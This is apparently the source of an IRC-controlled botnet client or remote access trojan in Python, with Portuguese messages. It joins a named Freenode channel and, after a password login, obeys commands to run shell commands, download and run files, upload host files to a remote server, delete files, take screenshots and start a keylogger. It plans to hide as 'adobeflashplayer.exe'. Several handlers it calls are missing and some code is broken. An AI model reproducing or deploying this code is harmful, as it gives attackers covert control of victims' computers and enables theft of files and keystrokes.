#!/usr/bin/python
#-*- coding: utf-8 -*-

import sys
import os
import socket # For function conn(): && ipLocal():
import platform # For variable pcName
import random # For variable pcName
import glob # For function listFile(): list files on the computer
import re # For function getPublicIp(): Ip Location
from urllib import urlopen # For function getPublicIp(): Ip Location
import requests # For function upload(): File Upload
import urllib,urllib2 # For function download(): downloading files via http
import subprocess # For function run(): to execute program
import time
ircServer= "chat.freenode.net"	# Address Server Irc
ircChanne= "#amarula4242"			# Channel for Bot connect
ircPwdCha= ""					# Password of Channel, if there enter the password or leave blank
botAdmi= "msOliver"				# A name for the welcome help, Not obligatory.
botPass= "12345"				# Not obligatory. A name for the welcome help
dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"	# Path to where the bot will copy + name it, Use \ double to separate directories: \\
urlFromUpload = "http://www.site.com.br/upload.php"		# URL that contains the php ARRAY to receive files via upload
urlFromUpShow = urlFromUpload.strip('http:upload.php')		# Variable that receives the URL to display uploaded files


def run():
	if os.path.isfile(str(fileRun)) == True:
		subprocess.call(['start', fileRun], shell=True)
		sendMsg(ircChanne, fileRun + " executado com sucesso.")
	else:
		sendMsg(ircChanne, fileRun + " arquivo nao existe.")

def download():
#REFERENCIA http://stackoverflow.com/questions/1096379/how-to-make-urllib2-requests-through-tor-in-python
	if urlDown.find("http://")!= -1 or urlDown.find("https://")!= -1:
		try:
			file_name = urlDown.split('/')[-1]
			u = urllib2.urlopen(urlDown)
			f = open(file_name, 'wb')
			meta = u.info()
			file_size = int(meta.getheaders("Content-Length")[0])
			sendMsg(ircChanne, "Downloading: %s - Tamanho: %s Bytes" % (file_name, file_size))
			f.write(u.read())
			f.close()
			sendMsg(ircChanne, "Download completo de: " + str(file_name))
		except IOError:
			sendMsg(ircChanne, "Voce nao tem privilegio para fazer o donwload")
	else:
		sendMsg(ircChanne, "Atencao: Falta [http://] OU [https://] na URL ")
def upload():
	#url = 'http://www.site.com.br/upload.php' #Arry Receber o arquivo
	global urlFromUpload, urlFromUpShow
	if os.path.exists(fileUp):
		files = {'file': open(fileUp, 'rb')}
		r = requests.post(urlFromUpload, files=files) #import requests
		sendMsg(ircChanne, "..::Arquivo urpado com sucesso::.. para http:"+urlFromUpShow + fileUp)
	else:
		sendMsg(ircChanne, "O arquivo nao existe " + "[ " + fileUp + " ]")

def getPublicIp():
    data = str(urlopen('http://checkip.dyndns.com/').read())
    return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)

def ipLocal():
    addresses = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1]
    return addresses

def listFile():
    file = glob.glob('*.*')
    for file in file:
        sendMsg(ircChanne, "Arquivo: [ " + file + " " + str(os.path.getsize(file)) + " kb ]")

def conn():
#REFERENCIA http://stackoverflow.com/questions/25616545/python-irc-bot-not-returning-full-list-of-channels
    try:
        ircSock.connect((ircServer, 6665)) #6667
    except socket.error:
        conn()
    else:
        ircSock.send(str.encode("USER "+ botNick +" "+ botNick +" "+ botNick +" :The Walking Dead\n"))
        ircSock.send(str.encode("NICK "+ botNick +"\n"))

def shell():
    process = subprocess.Popen (args=comando,stdout=subprocess.PIPE,shell=True)
    outt = (process.communicate())
    out2 = outt[0] #str(outt.decode('utf-8')) #str(outt.decode())
    out3 = out3.split('\r\n')


    for item in (out3):
        #item = item.decode('utf-8')
        #item = item
        item = item.replace("\x82", "?")
        item = item.replace("\xc6", "?")
        item = item.replace("\xa3", "?")
        item = item.replace("\xa1", "?")
        item = item.replace("\xa2", "?")
        item = item.replace("\x87", "?")
        item = item.replace("\x93", "?")
        item = item.replace("\xa0", "?")
        item = item.replace("\x88", "?")
        item = item.replace("\x83", "?")
        item = item.replace("\xc7", "?")
        item = item.replace("\xb8", "?")
        item = item.replace("\xad", "?")
        item = item.replace("\xef", "?")
        item = item.replace("\xa7", "?")
        item = item.replace("\xf5", "?")
        item = item.replace("\xf0", "?")
        item = item.replace("\xfc", "?")
        item = item.replace("\xa6", "?")


        sendMsg(ircChanne, item )
        time.sleep(1)

    #print process.stdout
    #sendMsg(ircChanne, out2)

    '''
    call = subprocess.call(comando, shell=True, stdout=subprocess.PIPE)
    print call.stdout
    output = subprocess.check_output(comando, stderr=subprocess.STDOUT)
    for linha in (ab):
        sendMsg(ircChanne, ' :' + str(linha) + ' \r\n')
    #sendMsg(ircChanne, (call))
    #sendMsg(ircChanne, "Comando executado com sucesso.")

    '''
    '''
    c = os.system(comando)
    print ("Resultado de c", c)
    ab = str(c).split()  ### pega todas as linhas de saída ### for linha in ab: irc.send('PRIVMSG '+channel+' :'+str(linha)+' \r\n')
    print ("Restultado de ab: ", ab)
    for linha in (ab):
        sendMsg(ircChanne, ' :'+str(linha)+' \r\n')
    
    call = subprocess.call(comando, shell=True)
    sendMsg(ircChanne,(call))
	sendMsg(ircChanne, "Comando executado com sucesso.")
    '''

def ping():
	ircSock.send (str.encode("PONG :pingis\n"))
def sendMsg(chan, msg):
	ircSock.send(str.encode("PRIVMSG " + chan +" :" + msg + "\n"))
def join(chan):
	ircSock.send(str.encode("JOIN " + chan + " " + ircPwdCha + "\n"))
def leaveChannel(chan):
	ircSock.send(str.encode("PART " + chan + " leaving the canal" + "\n"))
def quitIrc(chan):
    ircSock.send(str.encode("QUIT" + "\n"))
def main():
	global botAdmi, dir, ircSock, botNick, fileUp, urlDown, fileRun, maxPic, interval, delFile, logTime, logFileName, activeScreenshot


pcName = platform.node()
ircSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
botNick = pcName + "-" + str(random.randint(1, 10000))
# time.sleep(40) # Wait Initialization of the network card - Uncomment the line
conn()
join(ircChanne)
login = False
while login != True:
    ircMsg = ircSock.recv(5000)
    ircMsgClean = ircMsg.strip(str.encode('\n\r'))
    ircSock.send(str.encode("NICK " + botNick + "\n"))
    print(ircMsgClean)
    if ircMsg.find(ircMsg.replace("PING ", "PONG")) != -1:
        ping()
    if ircMsg.find(str.encode("login")) != -1:
        try:
            p = ircMsgClean.split()
            pwd = p[4]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <login> <senha>")
        else:
            if pwd != botPass:
                sendMsg(ircChanne, "ERROR: Senha Invalida, ou voce nao pode logar")
            else:
                sendMsg(ircChanne, "..::Conectado::.. " + botNick)
                login = True
while True:
    ircMsg = ircSock.recv(5000)
    ircMsgClean = ircMsg.strip(str.encode('\n\r'))
    print(ircMsgClean)
    if ircMsg.find(str.encode("Nickname is already in use")) != -1:
        botNick = pc_name + str(random.randint(1, 10000))
        ircSock.send(str.encode("NICK " + botNick + "\n"))
        join(ircChanne)
    if ircMsg.find(str.encode("PING :")) != -1:
        ping()
    elif ircMsg.find(str.encode(
            "leave")) != -1:  # Command used for the bot leave the channel, but remains connected to the irc server
        leaveChannel(ircChanne)
    elif ircMsg.find(str.encode("exit")) != -1:  # Command used for kill bot on irc server
        quitIrc(ircChanne)
        sys.exit()
    elif ircMsg.find(str.encode("help")) != -1:  # Command used to display help for the user
        try:
            p = ircMsgClean.split()
            id = p[4]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <help> <" + botNick + ">")
        else:
            if id == botNick:
                sendMsg(ircChanne, "!!- Bem Vindo -!! " + botAdmi)
                time.sleep(1)
                sendMsg(ircChanne, "use: [exi t] para matar os bots ativos")
                time.sleep(1)
                sendMsg(ircChanne, "use: [leav e] para os bots sair do canal")
                time.sleep(1)
                sendMsg(ircChanne, "use: [dir] para vizualizar o diretorio atual do bot")
                time.sleep(1)
                sendMsg(ircChanne, "use: [ls] para listar o conteudo da pasta atual")
                time.sleep(1)
                sendMsg(ircChanne, "use: [ip] para mostrar o ip da host")
                time.sleep(1)
                sendMsg(ircChanne, "use: [upload] para urpar arquivos")
                time.sleep(1)
                sendMsg(ircChanne, "use: [download] para baixar arquivos para o host")
                time.sleep(1)
                sendMsg(ircChanne, "use: [run] para executar um programa")
                time.sleep(1)
                sendMsg(ircChanne, "use: [screenshot] para tirar um foto da tela")
                time.sleep(1)
                sendMsg(ircChanne, "use: [multiscreens] para tirar multipla fotos da tela")
                time.sleep(1)
                sendMsg(ircChanne, "use: [delete] para deletar arquivos")
                time.sleep(1)
                sendMsg(ircChanne, "use: [info] mostras informacoes detalhada do computador")
                time.sleep(1)
                sendMsg(ircChanne, "use: [keylogger] para inicializar captura de teclas")
                time.sleep(1)
                sendMsg(ircChanne, "use: [blank] 0000000")
                time.sleep(1)
                sendMsg(ircChanne, "use: [blank] 0000000")
                time.sleep(1)
                sendMsg(ircChanne, "use: [blank] 0000000")
    elif ircMsg.find(str.encode("botnick")) != -1:  # Command to get bot nickname
        sendMsg(ircChanne, "Nickname: " + botNick)
    elif ircMsg.find(str.encode("dir")) != -1:  # Command to list the current directory of the bot
        try:
            p = ircMsgClean.split()
            id = p[4]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <dir> <" + botNick + ">")
        else:
            if id == botNick:
                sendMsg(ircChanne, "Diretorio atual do bot: " + sys.path[0])
    elif ircMsg.find(str.encode("ls")) != -1:  # Command to list the files in the current directory
        try:
            p = ircMsgClean.split()
            id = p[4]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <ls> <" + botNick + ">")
        else:
            if id == botNick:
                listFile()

    elif ircMsg.find(str.encode("shell")) != -1:  # Command to execute files on the host
        try:
            p = ircMsgClean.split()
            print (p)
            comando = p[4:-1]
            comando = " ".join(comando)
            print (comando)

            id = p[-1]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <shell> <comando> <" + botNick + ">")
        else:
            if comando == comando and id == botNick:
                shell()

                '''
    elif ircMsg.find(str.encode("ip")) != -1: # Command to get the host IP
        try:
            p = ircMsgClean.split()
            id = p[4]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <ip> <" + botNick +">")
        else:
            if id == botNick:
                yx = getPublicIp()
                xy = ipLocal()
                sendMsg(ircChanne, "IP Local: " + str(xy) +  " Ip Externo: " + "['" + yx + "']"  )'''
    elif ircMsg.find(str.encode("upload")) != -1:  # Command to upload files
        try:
            p = ircMsgClean.split()
            fileUp = p[4]
            id = p[5]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <upload> <Arquivo> <" + botNick + ">")
        else:
            if fileUp == fileUp and id == botNick:
                sendMsg(ircChanne, "..::Aguarde Arquivo sendo urpado::..")
                upload()
    elif ircMsg.find(str.encode("download")) != -1:  # Command to download files to the host
        try:
            p = ircMsgClean.split()
            urlDown = p[4]
            id = p[5]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <download> <link> <" + botNick + ">")
        # sendMsg(ircChanne,  "use: <download> <link> <" + botNick +">")
        else:
            if urlDown == urlDown and id == botNick:
                download()
    elif ircMsg.find(str.encode("run")) != -1:  # Command to execute files on the host
        try:
            p = ircMsgClean.split()
            fileRun = p[4] + " " + p[5]
            id = p[6]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <run> <programa> <" + botNick + ">")
        else:
            if fileRun == fileRun and id == botNick:
                run()
    elif ircMsg.find(str.encode("screenshot")) != -1:  # Command to take a screenshot of the host
        try:
            p = ircMsgClean.split()
            id = p[4]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <screenshot> <" + botNick + ">")
        else:
            if id == botNick:
                oneScreenshots()
                time.sleep(2)
                delLogPic()
    elif ircMsg.find(str.encode("multiscreens")) != -1:  # Command to take multiple screenshots
        try:
            p = ircMsgClean.split()
            maxPic = p[4]
            interval = p[5]
            id = p[6]
        except IndexError:
            sendMsg(ircChanne,
                    "..::Sintaxe Invalida::.. use: <multiscreens> <quantidade> <intervalo> <" + botNick + ">")
        else:
            if maxPic == maxPic and interval == interval and id == botNick:
                multipleScreenshots()
                time.sleep(2)
                delLogPic()
    elif ircMsg.find(str.encode("delete")) != -1:  # Command to delete files
        try:
            p = ircMsgClean.split()
            delFile = p[4]
            id = p[5]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <delete> <arquivo> <" + botNick + ">")
        else:
            if delFile == delFile and id == botNick:
                delFileY()
    elif ircMsg.find(str.encode("info")) != -1:  # Command to get information from the computer
        allBots = "bots"
        try:
            p = ircMsgClean.split()
            id = p[4]
        except IndexError:
            sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <info> <bots> ou <info> <" + botNick + ">")
        else:
            if id == botNick or id == allBots:
                infoBot()
    elif ircMsg.find(str.encode("keylogger")) != -1:  # Command to activate keyboard capture
        try:
            p = ircMsgClean.split()
            logTime = p[4]
            logFileName = p[5]
            activeScreenshot = p[6]
            id = p[7]
        except IndexError:
            sendMsg(ircChanne,
                    "..::Sintaxe Invalida::.. use: <keylogger> <tempo> <arquivo> <0/1 print> <" + botNick + ">")
        else:
            if logTime == logTime and logFileName == logFileName and activeScreenshot == activeScreenshot and id == botNick:
                sendMsg(ircChanne, "..::Keylogger Iniciado::..")
                Keylog()
                time.sleep(2)
                delLogTxt()
                time.sleep(2)
                delLogPic()
if __name__ == "__main__":
    main()